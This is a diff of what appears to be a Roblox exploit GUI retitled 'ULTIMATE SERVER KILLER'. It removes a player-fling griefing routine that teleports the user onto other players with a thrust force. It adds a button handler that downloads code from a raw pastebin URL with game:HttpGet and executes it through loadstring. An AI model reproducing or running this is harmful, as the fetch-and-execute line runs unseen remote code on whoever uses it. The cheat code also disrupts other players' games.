@@ -55,7 +55,7 @@ TextLabel.BorderSizePixel = 2
 TextLabel.Position = UDim2.new(2.50829402e-07, 0, 0, 0)
 TextLabel.Size = UDim2.new(0, 365, 0, 33)
 TextLabel.Font = Enum.Font.SourceSansBold
-TextLabel.Text = "SERVERSIDE SCRIPT"
+TextLabel.Text = "ULTIMATE SERVER KILLER"
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 14.000
@@ -77,7 +77,7 @@ TextButton_3.TextWrapped = true
 
 -- Scripts:
 
-local function ZYMZXUL_fake_script() -- Frame.LocalScript 
+local function YUSLXDF_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	-- Variables
@@ -98,8 +98,8 @@ local function ZYMZXUL_fake_script() -- Frame.LocalScript
 	end
 	
 end
-coroutine.wrap(ZYMZXUL_fake_script)()
-local function JJBBXW_fake_script() -- TextButton.LocalScript 
+coroutine.wrap(YUSLXDF_fake_script)()
+local function ONEZQ_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
 	-- Variables
@@ -120,71 +120,16 @@ local function JJBBXW_fake_script() -- TextButton.LocalScript
 	end
 	
 end
-coroutine.wrap(JJBBXW_fake_script)()
-local function DYKWIMF_fake_script() -- TextButton.LocalScript 
+coroutine.wrap(ONEZQ_fake_script)()
+local function UFTOD_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
-	local flingActive = false -- Tracks if the fling is active
-	local power = 500 -- Adjust this to change the power level
-	local player = game.Players.LocalPlayer
-	local runService = game:GetService("RunService")
-	local debounce = true
-	
 	script.Parent.MouseButton1Click:Connect(function()
-		flingActive = not flingActive -- Toggle fling mode on/off
-	
-		if flingActive then
-			-- Disable character collisions
-			runService.Stepped:Connect(function()
-				if player.Character then
-					for _, part in ipairs(player.Character:GetDescendants()) do
-						if part:IsA("BasePart") and part.CanCollide then
-							part.CanCollide = false
-						end
-					end
-				end
-			end)
-	
-			-- Coroutine for flinging to each player
-			coroutine.wrap(function()
-				while flingActive and player.Character and player.Character:FindFirstChild("HumanoidRootPart") do
-					for _, target in ipairs(game.Players:GetPlayers()) do
-						if target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-							-- Teleport to each player
-								-- Apply fling force
-							local bambam = Instance.new("BodyThrust")
-							bambam.Parent = player.Character.HumanoidRootPart
-							bambam.Force = Vector3.new(power, 0, power)
-							bambam.Location = player.Character.HumanoidRootPart.Position
-							
-							while debounce == true do
-								task.wait(0.01)
-							player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
-							if target.Character:FindFirstChild("HumanoidRootPart") == nil then
-								debounce = false
-								end
-							end
-	
-						end
-					end
-					wait(2) -- Delay between each round of teleportation
-				end
-			end)()
-		else
-			-- Clean up after fling is disabled
-			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-				for _, thrust in ipairs(player.Character.HumanoidRootPart:GetChildren()) do
-					if thrust:IsA("BodyThrust") then
-						thrust:Destroy()
-					end
-				end
-			end
-		end
+		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 	end)
-	
 end
-coroutine.wrap(DYKWIMF_fake_script)()
-local function TXJZIOY_fake_script() -- TextButton_2.LocalScript 
+coroutine.wrap(UFTOD_fake_script)()
+local function ADFDEHR_fake_script() -- TextButton_2.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_2)
 
 	-- Variables
@@ -205,8 +150,8 @@ local function TXJZIOY_fake_script() -- TextButton_2.LocalScript
 	end
 	
 end
-coroutine.wrap(TXJZIOY_fake_script)()
-local function AKVT_fake_script() -- TextButton_2.LocalScript 
+coroutine.wrap(ADFDEHR_fake_script)()
+local function GJQNYFU_fake_script() -- TextButton_2.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_2)
 
 	local btn = script.Parent
@@ -272,8 +217,8 @@ local function AKVT_fake_script() -- TextButton_2.LocalScript
 	end)
 	
 end
-coroutine.wrap(AKVT_fake_script)()
-local function ATOVWT_fake_script() -- TextLabel.LocalScript 
+coroutine.wrap(GJQNYFU_fake_script)()
+local function IAZYA_fake_script() -- TextLabel.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	-- Variables
@@ -294,8 +239,8 @@ local function ATOVWT_fake_script() -- TextLabel.LocalScript
 	end
 	
 end
-coroutine.wrap(ATOVWT_fake_script)()
-local function PKOD_fake_script() -- TextButton_3.LocalScript 
+coroutine.wrap(IAZYA_fake_script)()
+local function MFTU_fake_script() -- TextButton_3.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_3)
 
 	-- Variables
@@ -316,16 +261,16 @@ local function PKOD_fake_script() -- TextButton_3.LocalScript
 	end
 	
 end
-coroutine.wrap(PKOD_fake_script)()
-local function KAFTKF_fake_script() -- TextButton_3.LocalScript 
+coroutine.wrap(MFTU_fake_script)()
+local function OBLT_fake_script() -- TextButton_3.LocalScript 
 	local script = Instance.new('LocalScript', TextButton_3)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		print("Attached")
 	end)
 end
-coroutine.wrap(KAFTKF_fake_script)()
-local function VXJTGQ_fake_script() -- Frame.LocalScript 
+coroutine.wrap(OBLT_fake_script)()
+local function CEIAZZ_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	local frame = script.Parent
@@ -336,4 +281,4 @@ local function VXJTGQ_fake_script() -- Frame.LocalScript
 	
 	screengui.ResetOnSpawn = false
 end
-coroutine.wrap(VXJTGQ_fake_script)()
+coroutine.wrap(CEIAZZ_fake_script)()
